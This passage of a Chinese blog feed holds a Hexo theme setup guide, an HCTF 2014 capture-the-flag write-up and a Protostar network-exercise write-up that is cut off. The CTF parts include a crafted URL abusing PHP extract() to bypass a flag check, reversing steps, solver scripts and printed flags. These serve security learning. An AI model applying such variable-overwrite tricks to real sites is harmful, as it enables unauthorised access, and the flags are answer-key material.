class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── _config.yml</span><br><span class="line">├── package.json</span><br><span class="line">├── scaffolds</span><br><span class="line">├── scripts</span><br><span class="line">├── source</span><br><span class="line">|   ├── _drafts</span><br><span class="line">|   └── _posts</span><br><span class="line">└── themes</span><br></pre></td></tr></table></figure></p><ul><li><p>_config.yml<br>网站的<code>配置</code>信息，您可以在此配置大部分的参数。</p></li><li><p>package.json<br>应用程序的信息。<code>EJS</code>,<code>Stylus</code>和<code>Markdown renderer</code>默认安装，您可以自由移除。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">package.json</span><br><span class="line">&#123;</span><br><span class="line">  &quot;name&quot;: &quot;hexo-site&quot;,</span><br><span class="line">  &quot;version&quot;: &quot;&quot;,</span><br><span class="line">  &quot;private&quot;: true,</span><br><span class="line">  &quot;hexo&quot;: &#123;</span><br><span class="line">    &quot;version&quot;: &quot;&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;dependencies&quot;: &#123;</span><br><span class="line">    &quot;hexo-renderer-ejs&quot;: &quot;*&quot;,</span><br><span class="line">    &quot;hexo-renderer-stylus&quot;: &quot;*&quot;,</span><br><span class="line">    &quot;hexo-renderer-marked&quot;: &quot;*&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>scaffolds<br>模版文件夹。当您新建文章时，<code>Hexo</code>会根据<code>scaffold</code>来建立文件。</p></li><li><p>scripts<br>脚本文件夹。脚本是扩展<code>Hexo</code>最简易的方式，在此文件夹内的<code>JavaScript</code>文件会被自动执行。</p></li><li><p>source<br>资源文件夹是存放用户资源的地方。除<code>_posts</code>文件夹之外，开头命名为<code>_</code>(下划线)的文件<code>/</code>文件夹和隐藏的文件将会被忽略。<code>Markdown</code>和<code>HTML</code>文件会被解析并放到<code>public</code>文件夹，而其他文件会被拷贝过去。</p></li><li><p>themes<br>主题文件夹。<code>Hexo</code>会根据主题来生成静态页面。</p></li></ul><p>#自定义Hexo<br><code>Hexo</code>的主题很多，我这里使用的是<a href="https://github.com/wuchong/jacman" target="_blank" rel="noopener">Jacman</a>。</p><p>##安装<br>在博客根目录下执行如下命令。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https://github.com/wuchong/jacman.git themes/jacman</span><br></pre></td></tr></table></figure></p><p><code>Jacman</code>需要安装<code>Hexo 2.7</code>及以上版本，支持<code>Hexo 3.0</code>。请先升级您的<code>Hexo</code>程序，再启用此主题。</p><p>##启用<br>修改你的博客根目录下的<code>_config.yml</code>配置文件中的<code>theme</code>属性，将其设置为<code>jacman</code>。同时建议设置<code>stylus</code>属性中的<code>compress</code>值为<code>true</code>，会自动压缩<code>CSS</code>文件，<code>hexo</code>默认配置中不包含这一项，建议开启。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">theme: jacman</span><br><span class="line">stylus:</span><br><span class="line">  compress: true</span><br></pre></td></tr></table></figure></p><p>##更新<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd themes/jacman</span><br><span class="line">git pull origin master</span><br></pre></td></tr></table></figure></p><p>请先备份您主题目录下的<code>_config.yml</code>文件后再升级。</p><p>##配置指南<br>Jacman主题提供了丰富的配置属性，可以实现您对主题的自定义。配置文件<code>_config.yml</code>位于主题根目录下。本次更新对配置文件进行了较大调整，如您之前就使用了Jacman，也需要您根据以下指南进行相应的修改。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">##### 菜单</span><br><span class="line">menu:</span><br><span class="line">  主页: /</span><br><span class="line">  归档: /archives</span><br><span class="line">  关于: /about</span><br><span class="line"></span><br><span class="line">#### 控件</span><br><span class="line">widgets:</span><br><span class="line">- category</span><br><span class="line">- tag</span><br><span class="line">- links</span><br><span class="line">- rss</span><br><span class="line"></span><br><span class="line">#### RSS</span><br><span class="line">rss: /atom.xml</span><br><span class="line"></span><br><span class="line">#### 图片相关</span><br><span class="line">imglogo:</span><br><span class="line">  enable: true               ## 是否显示网站 logo</span><br><span class="line">  src: img/logo.png        </span><br><span class="line">favicon: img/favicon.ico     ## 网站图标    </span><br><span class="line">apple_icon: img/jacman.jpg   ## 苹果设备上的图标，背景不要透明</span><br><span class="line">author_img: img/author.jpg   ## 网站底部的博主头像</span><br><span class="line">banner_img: img/banner.jpg   ## 博客顶部的图片</span><br><span class="line"></span><br><span class="line">### 主题颜色</span><br><span class="line">theme_color:</span><br><span class="line">    theme: &apos;#2ca6cb&apos;    ##默认主题颜色为蓝色</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#### 首页相关</span><br><span class="line">index:</span><br><span class="line">  expand: true              ## 首页文章是否展开。默认为展开式，显示 Read More。</span><br><span class="line">  excerpt_link: Read More    </span><br><span class="line"></span><br><span class="line">#### 作者信息</span><br><span class="line">author:</span><br><span class="line">  intro_line1:  &quot;Hello ,I&apos;m Larry Page in Google.&quot;    ## 网站底部的个人介绍</span><br><span class="line">  intro_line2:  &quot;This is my blog,believe it or not.&quot;  </span><br><span class="line">  weibo_verifier:  ## 微博秀的验证码</span><br><span class="line">  tsina:           ## 用于微博秀和微博分享</span><br><span class="line">  weibo:           ## 用于显示网站底部社交按钮，下同</span><br><span class="line">  douban:         </span><br><span class="line">  zhihu:  </span><br><span class="line">  email:     </span><br><span class="line">  twitter:   </span><br><span class="line">  github:     </span><br><span class="line">  facebook:</span><br><span class="line">  linkedin:   </span><br><span class="line">  google_plus:   </span><br><span class="line">  stackoverflow:  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#### 目录</span><br><span class="line">toc:</span><br><span class="line">  article: true   ## 是否在文章中显示目录</span><br><span class="line">  aside: true     ## 是否在侧边栏显示目录</span><br><span class="line"></span><br><span class="line">#### 友情链接</span><br><span class="line">links:</span><br><span class="line">  xxx: https://xxx.com,xxxxxx</span><br><span class="line"></span><br><span class="line">#### 评论</span><br><span class="line">duoshuo_shortname:</span><br><span class="line">disqus_shortname:  </span><br><span class="line"></span><br><span class="line">#### 分享按钮</span><br><span class="line">jiathis:</span><br><span class="line">  enable: false   ## 默认使用主题内建分享</span><br><span class="line">  id:    </span><br><span class="line">  tsina:</span><br><span class="line"></span><br><span class="line">#### 网站统计</span><br><span class="line">google_analytics:</span><br><span class="line">  enable: false</span><br><span class="line">  id:            ## google analytics ID.</span><br><span class="line">  site:          ## 网站地址.</span><br><span class="line">baidu_tongji:</span><br><span class="line">  enable: false</span><br><span class="line">  sitecode:      ## 百度统计站点特征码</span><br><span class="line">cnzz_tongji:</span><br><span class="line">  enable: false</span><br><span class="line">  siteid:        ## CNZZ统计站点ID</span><br><span class="line"></span><br><span class="line">#### 杂项</span><br><span class="line">ShowCustomFont: true  </span><br><span class="line">fancybox: true        </span><br><span class="line">totop: true           </span><br><span class="line"></span><br><span class="line">#### 自定义搜索</span><br><span class="line">google_cse:</span><br><span class="line">  enable: false</span><br><span class="line">  cx:  </span><br><span class="line">baidu_search:    </span><br><span class="line">  enable: false</span><br><span class="line">  id:   </span><br><span class="line">  site: http://zhannei.baidu.com/cse/search</span><br></pre></td></tr></table></figure></p><ul><li>菜单 menu<br>默认没有启用<code>tags</code>和<code>categories</code>页面，如果需要启用请在博客目录下的<code>source</code>文件夹中分别建立<code>tags</code>和 <code>categories</code>文件夹每个文件夹中分别包含一个<code>index.md</code>文件。内容为：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">layout: tags (或categories)</span><br><span class="line">title: tags (或categories)</span><br><span class="line">---</span><br></pre></td></tr></table></figure></li></ul><p>因为主题中已经内置了这两个页面的模板，所以他们会被正确的解析出来。</p><ul><li><p>控件 widgets<br>提供了7种小工具。包括标签、标签云、分类、归档、RSS、友情链接、微博秀。<br>友情链接：友情链接的网址添加可以在<code>links</code>属性下添加。<br>微博秀：需要注意的是，如果要启用微博秀，您必须填上<code>author</code>属性下<code>tsina</code>和<code>weibo_verifier</code>的值，前者是您微博ID，后者是您微博秀的验证码，访问<a href="http://app.weibo.com/tool/weiboshow，可以获得您的" target="_blank" rel="noopener">http://app.weibo.com/tool/weiboshow，可以获得您的</a> verifier。</p></li><li><p>图片相关 Image<br>本主题可以设置网站相关图片，例如网站图标（favicon）、网站logo（imglogo）、作者头像（author_img）。建议启用网站logo，格式建议为.svg或.png格式。同时建议提供配套的 favicon 以及在苹果设备上的图标apple_icon（背景不要透明）。</p></li><li><p>首页显示模式 Index<br>目前首页的显示模式支持两种，一种是原先的卡片式，另一种是类似官方主题的文章展开式。两者各有优劣，前者首页加载速度更快，后者文章内容更能吸引读者。主题默认采用后一种展开式，如需开启第一种卡片式，请设置<code>index</code>属性下的<code>expand: false</code>。<br>卡片式的文章摘要是截取文章内容的前140个字，也可以自己总结<code>description</code>并将其放在开头的<code>front-matter</code>中。展开式的文章摘要就是使用<code>&lt;!-- more --&gt;</code>截取了。</p></li><li><p>作者信息 author<br>作者信息，建议尽量填写完整。其中<code>tsina</code>是你的新浪微博ID，不同于用户名或微博主页地址。启用这个属性后，其他用户在微博上分享你文章的同时会自动@你。同时它和<code>weibo_verifier</code>一起作用生成微博秀。<code>intro_line1</code>和<code>intro_line2</code>是网站底部的个人介绍。<code>weibo</code>、<code>twitter</code>、<code>facebook</code>等是用来显示网站右下角的社交按钮的，如下图所示。</p></li><li><p>目录 toc<br>是否启用在文章中或侧边栏中的目录功能。二者可以都为<code>true</code>或都为<code>false</code>。同时，如果你希望在特定的某一篇文章中关闭目录功能你可以在文章文件开头中的<code>front-matter</code>中加上一行<code>toc: false</code>。如果希望在某一篇文章中关闭目录自动编号功能你可以在文章文件开头的<code>front-matter</code>中加上一行<code>list_number: false</code>。另外<code>hexo 2.5.2</code>开始支持中文目录，想获得更好的体验请升级你的Hexo版本。</p></li><li><p>评论 comments<br>填写<code>duoshuo_shortname</code>多说的用户名，启用多说评论系统。在大陆地区更好用的评论系统。<br>填写<code>disqus_shortnamedisqus</code>的用户名，启用<code>disqus</code>论系统。国际上更广泛使用的评论系统。设置博客根目录下的<code>_config.yml</code>文件中的<code>disqus_shortname</code>同样也能开启该功能。</p></li><li><p>加网分享 jiathis<br>加网分享系统。默认关闭，因为主题已经内置了原生的分享功能。</p></li><li><p>网站统计 Analytics<br><code>baidu_tongji</code>：百度统计功能。需要填写站点特征码<code>sitecode</code>，在官网注册并配置站点后，获取特征码。特征码可以在「网站中心」-&gt; 「代码获取」中查看。</p></li><li><p>数学公式 mathjax<br>主题支持写<code>LaTex</code>数学公式。只需要在文章文件开头的<code>front-matter</code>中，加上一行<code>mathjax: true</code>，即可在文中写<code>LaTex</code>公式。</p></li><li><p>图片浏览 fancybox<br>默认关闭，如果你使用<code>Hexo</code>经常发表<code>Gallery</code>类型的文章，那么请设置为<code>true</code>。</p></li><li><p>返回顶部 totop<br>右下角<code>返回顶部</code>按钮，默认开启。</p></li><li><p>自定义字体 ShowCustomFont<br>是否启用自定义字体，默认开启，主要用于显示网站底部的字体。如果你有一定前端基础可以修改<code>font.style</code>替换为你喜欢的字体。</p></li><li><p>主题颜色更改 Theme Color</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">### Theme Color</span><br><span class="line">theme_color:</span><br><span class="line">  theme: &apos;#2ca6cb&apos;    ##the defaut theme color is blue</span><br></pre></td></tr></table></figure></li></ul><p>#使用</p><p>##写文章<br>接下来，我们要在网站中建立第一篇文章，您可以直接从现有的示例文章『Hello World』改写，但我们更建议您学习<code>new</code>指令。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new [layout] &lt;title&gt;</span><br></pre></td></tr></table></figure></p><p>您可以在命令中指定文章的布局（layout），默认为<code>post</code>，可以通过修改<code>_config.yml</code>中的<code>default_layout</code>参数来指定默认布局。</p><ul><li><p>布局（Layout）<br><code>Hexo</code>有三种默认布局：<code>post</code>、<code>page</code>和<code>draft</code>，它们分别对应不同的路径，而您自定义的其他布局和<code>post</code>相同，都将储存到<code>source/_posts</code>文件夹。</p></li><li><p>文件名称<br>Hexo 默认以标题做为文件名称，但您可编辑<code>new_post_name</code>参数来改变默认的文件名称，举例来说，设为<code>:year-:month-:day-:title.md</code>可让您更方便的通过日期来管理文章。</p></li><li><p>草稿<br>刚刚提到了<code>Hexo</code>的一种特殊布局<code>：draft</code>，这种布局在建立时会被保存到<code>source/_drafts</code>文件夹，您可通过<code>publish</code>命令将草稿移动到<code>source/_posts</code>文件夹，该命令的使用方式与<code>new</code>十分类似，您也可在命令中指定<code>layout</code>来指定布局。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo publish [layout] &lt;title&gt;</span><br></pre></td></tr></table></figure></li></ul><p>草稿默认不会显示在页面中，您可在执行时加上<code>--draft</code>参数，或是把<code>render_drafts</code>参数设为<code>true</code>来预览草稿。</p><ul><li>模版（Scaffold）<br>在新建文章时，<code>Hexo</code>会根据<code>scaffolds</code>文件夹内相对应的文件来建立文件，例如：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new photo &quot;My Gallery&quot;</span><br></pre></td></tr></table></figure></li></ul><p>在执行这行指令时，<code>Hexo</code>会尝试在<code>scaffolds</code>文件夹中寻找<code>photo.md</code>，并根据其内容建立文章。</p><p>##生成文件<br>使用<code>Hexo</code>生成静态文件快速而且简单。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo generate</span><br></pre></td></tr></table></figure></p><p>监视文件变动<br>Hexo 能够监视文件变动并立即重新生成静态文件，在生成时会比对文件的 SHA1 checksum，只有变动的文件才会写入。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo generate --watch</span><br></pre></td></tr></table></figure></p><p>##服务器<br><code>Hexo 3.0</code>把服务器独立成了个别模块，您必须先安装<code>hexo-server</code>才能使用。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-server --save</span><br></pre></td></tr></table></figure></p><p>安装完成后，输入以下命令以启动服务器，您的网站会在<code>http://localhost:4000</code>下启动。在服务器启动期间，<code>Hexo</code>会监视文件变动并自动更新，您无须重启服务器。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo server</span><br></pre></td></tr></table></figure></p><p>如果您想要更改端口，或是在执行时遇到了<code>EADDRINUSE</code>错误，可以在执行时使用<code>-p</code>选项指定其他端口，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo server -p 5000</span><br></pre></td></tr></table></figure></p><ul><li><p>静态模式<br>在静态模式下，服务器只处理<code>public</code>文件夹内的文件，而不会处理文件变动，在执行时，您应该先自行执行<code>hexo generate</code>，此模式通常用于生产环境（production mode）下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo server -s</span><br></pre></td></tr></table></figure></li><li><p>自定义 IP<br>服务器默认运行在<code>0.0.0.0</code>，您可以覆盖默认的<code>IP</code>设置，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo server -i 192.168.1.1</span><br></pre></td></tr></table></figure></li></ul><p>##部署<br><code>Hexo</code>提供了快速方便的一键部署功能，让您只需一条命令就能将网站部署到服务器上。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo deploy</span><br></pre></td></tr></table></figure></p><p>在开始之前，您必须先在<code>_config.yml</code>中修改参数，一个正确的部署配置中至少要有<code>type</code>参数，例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br></pre></td></tr></table></figure></p><p>您可同时使用多个<code>deployer</code>，<code>Hexo</code>会依照顺序执行每个<code>deployer</code>。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">- type: git</span><br><span class="line">  repo:</span><br><span class="line">- type: heroku</span><br><span class="line">  repo:</span><br></pre></td></tr></table></figure></p><ul><li><p>Git<br>安装<code>hexo-deployer-git</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure></li><li><p>修改配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: &lt;repository url&gt;</span><br><span class="line">  branch: [branch]</span><br><span class="line">  message: [message]</span><br></pre></td></tr></table></figure></li></ul><p>参数和对应的描述：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">repo    库（Repository）地址</span><br><span class="line">branch  分支名称。如果您使用的是 GitHub 或 GitCafe 的话，程序会尝试自动检测。</span><br><span class="line">message 自定提交信息 (默认为 Site updated: &#123;&#123; now(&quot;YYYY-MM-DD HH:mm:ss&quot;) &#125;&#125;)</span><br></pre></td></tr></table></figure></p><p>至此，Hexo基本使用已完成，对于搜索功能打算在另一片博客中单独介绍。</p>]]></content>
      
      <categories>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>HCTF 2014 Write-ups</title>
      <link href="/2014/11/10/HCTF-2014-Write-ups/"/>
      <url>/2014/11/10/HCTF-2014-Write-ups/</url>
      <content type="html"><![CDATA[<p>#HCTF</p><p>##丘比龙的最爱<br>丘比龙的最爱传说，丘比龙是丘比特的弟弟，丘比龙是一只小爱神，虽然有两只翅膀，但因为吃多了，导致身体太胖，所以飞不起来~那么问题来了?!丘比龙吃什么食物吃多了变胖了<br>没什么好说的，就是<code>甜甜圈</code>。</p><a id="more"></a><p>##nvshen<br>猫流大大发现一个女神，你能告诉我女神的名字么（名字即是flag） <a href="http://107.189.158.112/0aab9b20410fdd880c53922048023266/nvshen.zip" target="_blank" rel="noopener">http://107.189.158.112/0aab9b20410fdd880c53922048023266/nvshen.zip</a></p><p>下载的文件中有个txt文件，是Base64编码的，初步解码是判断png图片，将编码内容嵌入HTML中，显示一张图片：<br><img src="http://junzhepanblog.qiniudn.com/%E4%B8%8B%E8%BD%BD.png" alt="女神"><br>google一下，得到女神的名字：<code>爱新觉罗启星</code>。</p><p>##babyCrack<br>107.189.158.112/d55757a7ccf958399789e18e1d8199de/babyCrack.zip</p><p>解压后是是一个.Net的exe，直接用.Net Reflector反编译：</p><pre><code>private void button1_Click(object sender, EventArgs e){    bool flag = false;    Config.user = this.textBox1.Text;    string user = Config.user;    string str2 = &quot;hctf{bABy_CtsvlmE_!}&quot;;    if (str2.CompareTo(user) == 0)    {        flag = true;    }    if (flag)    {        MessageBox.Show(&quot;good !!!&quot;);    }}</code></pre><p>得到flag：<code>hctf{bABy_CtsvlmE_!}</code>。</p><p>##GIFT<br>主办方准备了一个礼物! <a href="http://121.40.86.166:39099" target="_blank" rel="noopener">http://121.40.86.166:39099</a></p><p>访问后，查看源码，提示有<code>index.php.bak</code>，下载后查看源码：</p><pre><code>&lt;?php    $flag=&apos;xxx&apos;;    extract($_GET);    if(isset($gift)){        $content=trim(file_get_contents($flag));        if($gift==$content){            echo&apos;hctf{...}&apos;;        }else{            echo&apos;Oh..&apos;;        }    }?&gt;</code></pre><p>根据源码，用get参数将<code>flag</code>的值覆盖，使其是一个 不存在的文件名，然后将<code>gift</code>的内容赋值为空，构造url如下：<br><a href="http://121.40.86.166:39099/?gift=&amp;flag=aaaaa" target="_blank" rel="noopener">http://121.40.86.166:39099/?gift=&amp;flag=aaaaa</a><br>得到flag：<code>hctf{Awe3ome_Ex7ract!!!}</code>。</p><p>##babyCrack2<br>107.189.158.112/e81cbc49ae92b00d3b55430f21cbe2fe/babyCrack2.zip</p><p>IDA反汇编，查看字符串得到flag：idug|3`5ut`CCbZ`DusnF`34~</p><p>##Entry<br>57R9S980RNOS49973S757PQO9S80Q36P 听说丘比龙一口气能吃”13”个甜甜圈呢!</p><p>32位，感觉想MD5，尝试如下对应：</p><pre><code>NOPQRSABCDEF</code></pre><p>得到<code>57E9F980EABF49973F757CDB9F80D36C</code>，然后破解MD5，得到<code>Qoobee</code></p><p>##FIND<br>Find what？ <a href="http://107.189.158.112/f60a0a6ffd7c297964a718dc21546975/stego_final.png" target="_blank" rel="noopener">http://107.189.158.112/f60a0a6ffd7c297964a718dc21546975/stego_final.png</a></p><p>用神器stego solve分析，得到二维码：<br><img src="http://junzhepanblog.qiniudn.com/qcode.jpg" alt="qcode"><br>扫描即可得到flag：<code>flag{hctf_3xF$235#\x5e3}</code></p><p>##NormalFile<br>你能找到其中的深意么？ <a href="http://107.189.158.112/fdd9df21d6c5d65fe519f69f8424d65b/NormalFile.jpg" target="_blank" rel="noopener">http://107.189.158.112/fdd9df21d6c5d65fe519f69f8424d65b/NormalFile.jpg</a></p><p>下载图片，提取出一个zip文件，解压，又有一张图片，又提取出一个apk，反编译apk，分析flag生成过程，一开始没看到half那个字符串，以为答案有多个，随便生成一个，提交发现不对，后来在string.xml找到half才确定，自己用Python实现：</p><pre><code>num_xor = [112, 83, 93, 112, 28, 0, 87, 91]half = &apos;401!n++p&apos;def main():    last = &apos;&apos;    for i in xrange(0, 8):        last += chr(ord(half[i]) ^ num_xor[i])    flag = &apos;hctf{&apos; + half[0] + half[4] + last[0] + last[4] + half[1] + half[2] \           + last[1] + last[2] + half[2] + half[1] + last[2] + last[6] + half[3] \           + half[7] + last[3] + half[7] + &apos;}&apos;    print flag</code></pre><p>运行得到flag：<code>hctf{4nDr01cl10l|!pQp}</code>。</p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Exploit Exercises Protostar Net Write-ups</title>
      <link href="/2014/10/11/Exploit-Exercises-Protostar-Net-Write-ups/"/>
      <url>/2014/10/11/Exploit-Exercises-Protostar-Net-Write-ups/</url>
      <content type="html"><![CDATA[<p>#Net</p><p>##Net 0<br>About<br>This level takes a look at converting strings to little endian integers.</p><p>This level is at /opt/protostar/bin/net0</p><a id="more"></a><p>Source code</p><pre><code>#include &quot;../common/common.c&quot;#define NAME &quot;net0&quot;#define UID 999#define GID 999#define PORT 2999void run(){ unsigned int i; unsigned int wanted; wanted = random(); printf(&quot;Please send &apos;%d&apos; as a little endian 32bit int\n&quot;, wanted); if(fread(&amp;i, sizeof(i), 1, stdin) == NULL) {  errx(1, &quot;:(\n&quot;); } if(i == wanted) {  printf(&quot;Thank you sir/madam\n&quot;); } else {  printf(&quot;I&apos;m sorry, you sent %d instead\n&quot;, i); }}int main(int argc, char **argv, char **envp){ int fd; char *username; /* Run the process as a daemon */ background_process(NAME, UID, GID); /* Wait for socket activity and return */ fd = serve_forever(PORT); /* Set the client socket to STDIN, STDOUT, and STDERR */ set_io(fd); /* Don&apos;t do this :&gt; */ srandom(time(NULL)); run();}</code></pre><p>先用nc去连接，看一下：</p><pre><code>$ nc localhost 2999Please send &apos;2081363632&apos; as a little endian 32bit int2081363632I&apos;m sorry, you sent 825765938 instead</code></pre><p>既然需要小端的顺序，用Python实现：</p><pre><code>import socketfrom struct import packfrom binascii import hexlifyRHOST = &apos;192.168.126.129&apos;RPORT = 2999s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.connect((RHOST, RPORT))data = s.recv(1024)print &quot;%s&quot; % datavalue = int((data.split()[2])[1:-1])print &quot;Big Endian: 0x%x&quot; % valuevalue = pack(&quot;&lt;I&quot;, value) # little endianprint &quot;Little Endian: 0x%s&quot; % hexlify(value)s.sendall(value) # send the value backdata = s.recv(1024)print &quot;%s&quot; % data # print the confirmations.close()</code></pre><p>结果如下：</p><pre><code>Please send &apos;1104733458&apos; as a little endian 32bit intBig Endian: 0x41d8e512Little Endian: 0x12e5d841Thank you sir/madam</code></pre><p>##Net 1<br>About<br>This level introduces the concept that memory can be accessed outside of its allocated region, how the stack variables are laid out, and that modifying outside of the allocated memory can modify program execution.</p><p>This level is at /opt/protostar/bin/net1</p><p>Source code</p><pre><code>#include &quot;../common/common.c&quot;#define NAME &quot;net1&quot;#define UID 998#define GID 998#define PORT 2998void run(){ char buf[12]; char fub[12]; char *q; unsigned int wanted; wanted = random(); sprintf(fub, &quot;%d&quot;, wanted); if(write(0, &amp;wanted, sizeof(wanted)) != sizeof(wanted)) {  errx(1, &quot;:(\n&quot;); } if(fgets(buf, sizeof(buf)-1, stdin) == NULL) {  errx(1, &quot;:(\n&quot;); } q = strchr(buf, &apos;\r&apos;); if(q) *q = 0; q = strchr(buf, &apos;\n&apos;); if(q) *q = 0; if(strcmp(fub, buf) == 0) {  printf(&quot;you correctly sent the data\n&quot;); } else {  printf(&quot;you didn&apos;t send the data properly\n&quot;); }}int main(int argc, char **argv, char **envp){ int fd; char *username; /* Run the process as a daemon */ background_process(NAME, UID, GID); /* Wait for socket activity and return */ fd = serve_forever(PORT); /* Set the client socket to STDIN, STDOUT, and STDERR */ set_io(fd); /* Don&apos;t do this :&gt; */ srandom(time(NULL)); run();}</code></pre><p>连上，看看让干啥：</p><pre><code>$ nc localhost 2998▒Ͷssssyou didn&apos;t send the data properly</code></pre><p>用Python实现：</p><pre><code>import socketimport structRHOST = &apos;192.168.126.129&apos;RPORT = 2998s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.connect((RHOST, RPORT))data = s.recv(1024)print &quot;Receive data: %s&quot; % datavalue = struct.unpack(&quot;i&quot;, data)s.sendall(&quot;%s\r\n&quot; % value) # send the value backdata = s.recv(1024)print &quot;%s&quot; % data # print the confirmations.close()</code></pre><p>结果如下：</p><pre><code>Receive data: C�@you correctly sent the data</code></pre><p>##Net 2<br>About<br>This level introduces the concept that memory can be accessed outside of its allocated region, how the stack variables are laid out, and that modifying outside of the allocated memory can modify program execution.</p><p>This level is at /opt/protostar/bin/net2</p><p>Source code</p><pre><code>#include &quot;../common/common.c&quot;#define NAME &quot;net2&quot;#define UID 997#define GID 